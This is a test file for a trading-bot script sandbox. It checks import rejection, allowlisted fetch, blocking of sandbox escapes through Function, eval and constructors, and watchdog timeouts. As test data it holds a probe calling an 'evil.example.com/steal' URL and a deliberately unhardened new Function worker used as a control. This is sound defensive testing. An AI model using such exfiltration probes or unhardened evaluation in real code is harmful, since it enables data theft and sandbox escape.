/**
 * Script sandbox (spec §5.1): compile-time import rejection, worker without require/process/env,
 * allowlisted ctx.fetch through the main process, tick watchdog.
 * Spawns real worker threads from an esbuild bundle of worker-bootstrap.ts.
 */

import { describe, it, expect, vi, beforeAll, afterEach } from 'vitest';
import fs from 'fs';
import os from 'os';
import path from 'path';

vi.mock('../../packages/core/src/utils/logger', () => ({
  default: { info: vi.fn(), warning: vi.fn(), error: vi.fn() },
}));

import { compileScript } from '../../packages/core/src/runtime/compileScript';
import { ScriptRunner, type ScriptRunnerOptions } from '../../packages/core/src/runtime/ScriptRunner';
import { scriptFetch } from '../../packages/core/src/runtime/scriptFetch';
import { RpcHandler, MAX_CONCURRENT_FETCHES } from '../../packages/core/src/runtime/RpcHandler';
import { evaluateScript } from '../../packages/core/src/runtime/sandbox';
import { buildWorker, ROOT } from './buildWorker';
import { escapeProbe, PROBE_ATTEMPTS } from './escapeProbe';

async function compileOk(source: string): Promise<string> {
  const r = await compileScript(source);
  if ('error' in r) throw new Error(r.error);
  return r.code;
}

describe('compileScript', () => {
  it('rejects module imports', async () => {
    const r = await compileScript("import fs from 'fs';\nexport function onTick() { fs.readFileSync('x'); }");
    expect(r).toHaveProperty('error');
    expect((r as { error: string }).error).toMatch(/Imports are not allowed.*"fs"/);
  });

  it('rejects require() and dynamic import()', async () => {
    const r1 = await compileScript("const cp = require('child_process');\nexport function onTick() { cp.exec('ls'); }");
    expect((r1 as { error: string }).error).toMatch(/child_process/);
    const r2 = await compileScript("export async function onTick() { await import('node:fs'); }");
    expect((r2 as { error: string }).error).toMatch(/node:fs/);
    const r3 = await compileScript("import { x } from './helper';\nexport function onTick() { return x; }");
    expect(r3).toHaveProperty('error');
  });

  it('allows type-only imports', async () => {
    const code = await compileOk("import type { BotContext } from '../sdk/types';\nexport async function onTick(ctx: BotContext) { ctx.log.info('x'); }");
    expect(evaluateScript(code, {}).onTick).toBeTypeOf('function');
  });

  it('compiles every builtin template', async () => {
    const dir = path.join(ROOT, 'templates');
    const files = fs.readdirSync(dir).filter((f) => f.endsWith('.ts'));
    expect(files.length).toBeGreaterThan(0);
    for (const f of files) {
      const code = await compileOk(fs.readFileSync(path.join(dir, f), 'utf-8'));
      const exp = evaluateScript(code, {});
      expect(typeof exp.onStart === 'function' || typeof exp.onTick === 'function').toBe(true);
    }
  });

  it('evaluateScript does not pass require or process', async () => {
    const exp = evaluateScript('exports.r = typeof require; exports.p = typeof process;', {});
    expect(exp).toMatchObject({ r: 'undefined', p: 'undefined' });
  });
});

describe('scriptFetch (main side)', () => {
  const okResponse = () => new Response('{"a":1}', { status: 200, headers: { 'content-type': 'application/json' } });

  it('rejects hosts outside the allowlist, http and other methods', async () => {
    const fetchImpl = vi.fn(async () => okResponse());
    await expect(scriptFetch('https://evil.example.com/x', undefined, { fetchImpl })).rejects.toThrow(/host not allowed/);
    await expect(scriptFetch('http://data-api.polymarket.com/x', undefined, { fetchImpl })).rejects.toThrow(/only https/);
    await expect(scriptFetch('https://data-api.polymarket.com/x', { method: 'DELETE' }, { fetchImpl })).rejects.toThrow(/method not allowed/);
    await expect(scriptFetch('https://data-api.polymarket.com.evil.com/x', undefined, { fetchImpl })).rejects.toThrow(/host not allowed/);
    expect(fetchImpl).not.toHaveBeenCalled();
  });

  it('does not follow a redirect to a host outside the allowlist', async () => {
    const fetchImpl = vi.fn(async () => new Response(null, { status: 302, headers: { location: 'https://evil.example.com/' } }));
    await expect(scriptFetch('https://data-api.polymarket.com/x', undefined, { fetchImpl })).rejects.toThrow(/host not allowed: evil/);
    expect(fetchImpl).toHaveBeenCalledTimes(1);
  });

  it('caps the response size', async () => {
    const big = 'x'.repeat(5000);
    const fetchImpl = vi.fn(async () => new Response(big, { status: 200 }));
    await expect(scriptFetch('https://data-api.polymarket.com/x', undefined, { fetchImpl, maxBytes: 1000 })).rejects.toThrow(/too large/);
  });

  it('times out', async () => {
    const fetchImpl = vi.fn(
      (_url: string, init: RequestInit) =>
        new Promise<Response>((_res, rej) => init.signal!.addEventListener('abort', () => rej(new Error('aborted'))))
    ) as unknown as typeof fetch;
    await expect(scriptFetch('https://data-api.polymarket.com/x', undefined, { fetchImpl, timeoutMs: 50 })).rejects.toThrow(/timed out/);
  });

  it('honours a configured allowlist', async () => {
    const fetchImpl = vi.fn(async () => okResponse());
    await expect(scriptFetch('https://data-api.polymarket.com/x', undefined, { fetchImpl, allowlist: ['example.org'] })).rejects.toThrow(/host not allowed/);
    const r = await scriptFetch('https://EXAMPLE.org/x', undefined, { fetchImpl, allowlist: ['example.org'] });
    expect(r).toMatchObject({ ok: true, status: 200, body: '{"a":1}' });
  });
});

describe('ctx.fetch concurrency', () => {
  it(`allows at most ${MAX_CONCURRENT_FETCHES} requests in flight per bot and rejects the excess at once`, async () => {
    const pending: Array<() => void> = [];
    const fetchImpl = vi.fn(
      () => new Promise<Response>((resolve) => pending.push(() => resolve(new Response('ok', { status: 200 }))))
    ) as unknown as typeof fetch;
    const handler = new RpcHandler({ botId: 'b', botName: 'b', fetchImpl } as never);
    const req = (i: number) => handler.handle({ id: `r${i}`, method: 'fetch', args: ['https://data-api.polymarket.com/x'] });

    const first = Array.from({ length: MAX_CONCURRENT_FETCHES }, (_, i) => req(i));
    await new Promise((r) => setTimeout(r, 10));
    expect(fetchImpl).toHaveBeenCalledTimes(MAX_CONCURRENT_FETCHES);

    const excess = await req(99); // resolves immediately with an error
    expect(excess.error).toMatch(/too many concurrent requests/);
    expect(fetchImpl).toHaveBeenCalledTimes(MAX_CONCURRENT_FETCHES);

    pending.splice(0).forEach((f) => f());
    const done = await Promise.all(first);
    expect(done.every((r) => r.result && r.result.status === 200)).toBe(true);

    // Slots are released: a new request goes through
    const again = req(100);
    await new Promise((r) => setTimeout(r, 10));
    pending.splice(0).forEach((f) => f());
    expect((await again).result.status).toBe(200);

    // A different bot (handler) has its own budget
    const other = new RpcHandler({ botId: 'c', botName: 'c', fetchImpl } as never);
    const o = other.handle({ id: 'o', method: 'fetch', args: ['https://data-api.polymarket.com/x'] });
    await new Promise((r) => setTimeout(r, 10));
    pending.splice(0).forEach((f) => f());
    expect((await o).result.status).toBe(200);
  });
});

describe('script worker', () => {
  let bootstrapPath: string;
  const runners: ScriptRunner[] = [];

  beforeAll(async () => {
    bootstrapPath = await buildWorker(path.join(ROOT, 'packages', 'core', 'src', 'runtime', 'worker-bootstrap.ts'));
  }, 30_000);

  afterEach(async () => {
    for (const r of runners.splice(0)) await r.stop(2000).catch(() => undefined);
  });

  function makeRunner(compiledCode: string, overrides: Partial<ScriptRunnerOptions> = {}, fetchImpl?: typeof fetch): ScriptRunner {
    const runner = new ScriptRunner({
      compiledCode,
      botId: 'bot-1',
      botName: 'Sandbox Bot',
      config: { pollingIntervalMs: 20 },
      walletAddress: '0xwallet',
      bootstrapPath,
      rpcHandlerDeps: {
        clobClient: {} as never,
        storageRepo: { get: vi.fn(), set: vi.fn(), delete: vi.fn() } as never,
        tradeRepo: {} as never,
        botId: 'bot-1',
        botName: 'Sandbox Bot',
        scriptName: 'sandbox',
        walletAddress: '0xwallet',
        rpcUrl: 'http://rpc',
        usdcContractAddress: '0xusdc',
        clobHttpUrl: 'http://clob',
        fetchImpl,
      },
      ...overrides,
    });
    runner.on('error', () => undefined);
    runners.push(runner);
    return runner;
  }

  function nextEvent<T>(runner: ScriptRunner, name: string, timeoutMs = 10_000): Promise<T> {
    return new Promise<T>((resolve, reject) => {
      const t = setTimeout(() => reject(new Error(`no ${name} event`)), timeoutMs);
      runner.once(name, (e: T) => {
        clearTimeout(t);
        resolve(e);
      });
    });
  }

  it('has no require/process, and ctx.fetch only reaches allowlisted hosts through the main process', async () => {
    const fetchImpl = vi.fn(async () => new Response('[{"type":"TRADE"}]', { status: 200, headers: { 'Content-Type': 'application/json' } }));
    const code = await compileOk(`
      export async function onStart(ctx) {
        const g = globalThis;
        let denied = '';
        try { await ctx.fetch('https://evil.example.com/steal?k=1'); } catch (e) { denied = e.message; }
        const resp = await ctx.fetch('https://data-api.polymarket.com/activity?user=0xabc');
        ctx.emit('probe', {
          require: typeof require,
          process: typeof process,
          globalProcess: typeof g.process,
          fetch: typeof fetch,
          globalFetch: typeof g.fetch,
          denied,
          ok: resp.ok,
          status: resp.status,
          contentType: resp.headers.get('content-type'),
          body: await resp.json(),
        });
      }
    `);
    const runner = makeRunner(code, {}, fetchImpl as unknown as typeof fetch);
    const probe = nextEvent<{ type: string; data: Record<string, unknown> }>(runner, 'event');
    await runner.start();
    const { type, data } = await probe;
    expect(type).toBe('probe');
    expect(data).toMatchObject({
      require: 'undefined',
      process: 'undefined',
      globalProcess: 'undefined',
      fetch: 'undefined',
      globalFetch: 'undefined',
      ok: true,
      status: 200,
      contentType: 'application/json',
      body: [{ type: 'TRADE' }],
    });
    expect(String(data.denied)).toMatch(/host not allowed: evil\.example\.com/);
    expect(fetchImpl).toHaveBeenCalledTimes(1);
    expect((fetchImpl.mock.calls[0] as unknown[])[0]).toBe('https://data-api.polymarket.com/activity?user=0xabc');
  });

  it('closes the known escapes (Function, eval, import(), ctx/timer/promise/error constructors, Reflect.construct...)', async () => {
    const runner = makeRunner(escapeProbe("ctx.emit('escapes', results);"));
    const ev = nextEvent<{ type: string; data: Record<string, string> }>(runner, 'event');
    await runner.start();
    const { type, data } = await ev;
    expect(type).toBe('escapes');
    for (const name of PROBE_ATTEMPTS) {
      expect(data[name], name).toBeDefined();
      expect(data[name], `${name}: ${data[name]}`).not.toBe('ESCAPED');
    }
    // Code generation and import() must actually be refused, not just come back empty
    for (const name of ['Function', 'newFunction', 'eval', 'indirectEval', 'asyncFnConstructor', 'generatorConstructor',
      'asyncGeneratorConstructor', 'reflectConstruct', 'globalThisConstructor', 'thisConstructor']) {
      expect(data[name], name).toMatch(/^blocked: EvalError/);
    }
    expect(data.literalImport).toMatch(/^blocked/);
    expect(data.wasm).toMatch(/^blocked/);
    for (const name of ['ctxMethodConstructor', 'ctxNestedMethodConstructor', 'ctxCallConstructor', 'ctxProtoConstructor',
      'ctxConfigConstructor', 'ctxObjectConstructor', 'ctxPromiseConstructor', 'ctxPromiseThenConstructor',
      'ctxErrorConstructor', 'ctxAsyncFnConstructor', 'timerConstructor', 'timerObjectConstructor', 'consoleConstructor',
      'reflectConstructCtx']) {
      expect(data[name], name).toMatch(/^blocked: TypeError/); // constructor is undefined in the worker realm
    }
  });

  it('the escape probe detects an escape in an unhardened worker (control)', async () => {
    // Same probe in a plain worker using the pre-review evaluation (new Function, no vm, no hardening)
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'botlab-control-'));
    const controlPath = path.join(dir, 'control.js');
    fs.writeFileSync(
      controlPath,
      `const { parentPort, workerData } = require('worker_threads');
       const ctx = {
         fetch: async () => { throw new Error('denied'); },
         storage: { get: async () => null },
         log: { info: () => undefined },
         binance: { getPrice: async () => null },
         config: {},
       };
       const mod = { exports: {} };
       new Function('module', 'exports', 'ctx', workerData.code)(mod, mod.exports, ctx);
       mod.exports.onStart(ctx).then(() => parentPort.postMessage(mod.exports.results));`
    );
    const { Worker } = await import('worker_threads');
    const w = new Worker(controlPath, { workerData: { code: escapeProbe('module.exports.results = results;') } });
    const results = await new Promise<Record<string, string>>((resolve, reject) => {
      w.once('message', resolve);
      w.once('error', reject);
    });
    await w.terminate();
    expect(results.Function).toBe('ESCAPED');
    expect(results.ctxMethodConstructor).toBe('ESCAPED');
    expect(results.literalImport).toBe('ESCAPED');
    expect(results.indirectEval).toBe('ESCAPED');
    expect(results.globalProcess).toBe('ESCAPED');
  });

  it('starts workers with an empty env and heap limits', async () => {
    process.env.BOTLAB_TEST_SECRET = 'do-not-leak';
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'botlab-probe-'));
    const probePath = path.join(dir, 'probe.js');
    fs.writeFileSync(
      probePath,
      `const { parentPort } = require('worker_threads');
       const v8 = require('v8');
       parentPort.on('message', (m) => {
         if (m.type === 'start') {
           parentPort.postMessage({ type: 'rpc-request', request: { id: 'p1', method: 'emit', args: ['env', {
             envKeys: Object.keys(process.env),
             heapLimitMb: v8.getHeapStatistics().heap_size_limit / 1048576,
           }] } });
           parentPort.postMessage({ type: 'started' });
         } else if (m.type === 'stop') {
           parentPort.postMessage({ type: 'stopped' });
         }
       });`
    );
    try {
      const runner = makeRunner('', { bootstrapPath: probePath });
      const ev = nextEvent<{ data: { envKeys: string[]; heapLimitMb: number } }>(runner, 'event');
      await runner.start();
      const { data } = await ev;
      expect(data.envKeys).toEqual([]);
      expect(data.heapLimitMb).toBeLessThan(400);
    } finally {
      delete process.env.BOTLAB_TEST_SECRET;
    }
  });

  it('watchdog terminates a worker whose onTick never returns (sync loop)', async () => {
    const code = await compileOk('export function onTick(ctx) { while (true) {} }');
    const runner = makeRunner(code, { tickTimeoutMs: 100, maxTickTimeouts: 3 });
    const strikes: number[] = [];
    runner.on('tick-timeout', (e: { strikes: number }) => strikes.push(e.strikes));
    const fatal = nextEvent<{ reason: string; message: string }>(runner, 'fatal');
    await runner.start();
    const f = await fatal;
    expect(f.reason).toBe('tick_watchdog');
    expect(strikes).toEqual([1, 2, 3]);
    expect(runner.isRunning).toBe(false);
  });

  it('watchdog terminates a worker whose onTick hangs asynchronously', async () => {
    const code = await compileOk('export function onTick(ctx) { return new Promise(() => {}); }');
    const runner = makeRunner(code, { tickTimeoutMs: 100, maxTickTimeouts: 3 });
    const fatal = nextEvent<{ reason: string }>(runner, 'fatal');
    await runner.start();
    expect((await fatal).reason).toBe('tick_watchdog');
  });

  it('a slow tick that recovers resets the strike count', async () => {
    // First tick takes ~250 ms (2 strikes at 100 ms), the rest are fast: never 3 in a row
    const code = await compileOk(`
      let n = 0;
      export async function onTick(ctx) {
        n++;
        if (n === 1 || n === 3) await new Promise((r) => setTimeout(r, 250));
      }
    `);
    const runner = makeRunner(code, { tickTimeoutMs: 100, maxTickTimeouts: 3 });
    const onFatal = vi.fn();
    runner.on('fatal', onFatal);
    await runner.start();
    await new Promise((r) => setTimeout(r, 1200));
    expect(onFatal).not.toHaveBeenCalled();
    expect(runner.isRunning).toBe(true);
  });

  it('liveness: a synchronous loop in a ctx.setInterval callback ends as worker_unresponsive', async () => {
    const code = await compileOk(`
      export async function onStart(ctx) {
        ctx.setInterval(() => { while (true) {} }, 30);
      }
    `);
    const runner = makeRunner(code, { livenessPingMs: 50, livenessTimeoutMs: 300 });
    const onTimeout = vi.fn();
    runner.on('tick-timeout', onTimeout);
    const fatal = nextEvent<{ reason: string; message: string }>(runner, 'fatal');
    await runner.start();
    const f = await fatal;
    expect(f.reason).toBe('worker_unresponsive');
    expect(onTimeout).not.toHaveBeenCalled(); // the tick watchdog never saw it
    expect(runner.isRunning).toBe(false);
  });

  it('liveness: an idle or async-waiting worker keeps answering pings', async () => {
    const code = await compileOk(`
      export async function onStart(ctx) {
        ctx.setInterval(async () => { await new Promise((r) => setTimeout(r, 10_000)); }, 20);
      }
    `);
    const runner = makeRunner(code, { livenessPingMs: 50, livenessTimeoutMs: 200 });
    const onFatal = vi.fn();
    runner.on('fatal', onFatal);
    await runner.start();
    await new Promise((r) => setTimeout(r, 700));
    expect(onFatal).not.toHaveBeenCalled();
    expect(runner.isRunning).toBe(true);
  });

  it('a clean stop is not reported as fatal', async () => {
    const code = await compileOk('export function onTick(ctx) {}');
    const runner = makeRunner(code);
    const onFatal = vi.fn();
    runner.on('fatal', onFatal);
    await runner.start();
    await runner.stop(2000);
    await new Promise((r) => setTimeout(r, 50));
    expect(onFatal).not.toHaveBeenCalled();
  });
});
